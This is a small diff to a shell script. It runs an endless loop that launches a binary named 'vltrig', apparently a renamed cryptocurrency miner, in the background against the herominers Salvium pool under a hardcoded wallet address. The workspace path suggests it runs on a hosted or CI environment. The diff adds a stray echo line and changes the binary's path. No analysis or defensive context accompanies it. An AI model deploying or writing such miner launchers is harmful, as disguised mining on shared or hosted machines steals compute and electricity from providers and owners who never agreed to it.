@@ -1,6 +1,8 @@
 while true
 do
-  /home/runner/workspace/vltrig \
+  echo "aman bang"
+
+  ./vltrig \
     -o sg.salvium.herominers.com:1230 \
     -u SC1siBfG9HHfqjGkSYgEqALbd4WQZ37ZAj9mjPMgfqzdUiHrRuKEYLRLEm7uQt81xBgs2QzEEi6Yi6VXXqU5p6U8f124RMEobFN \
     -B \
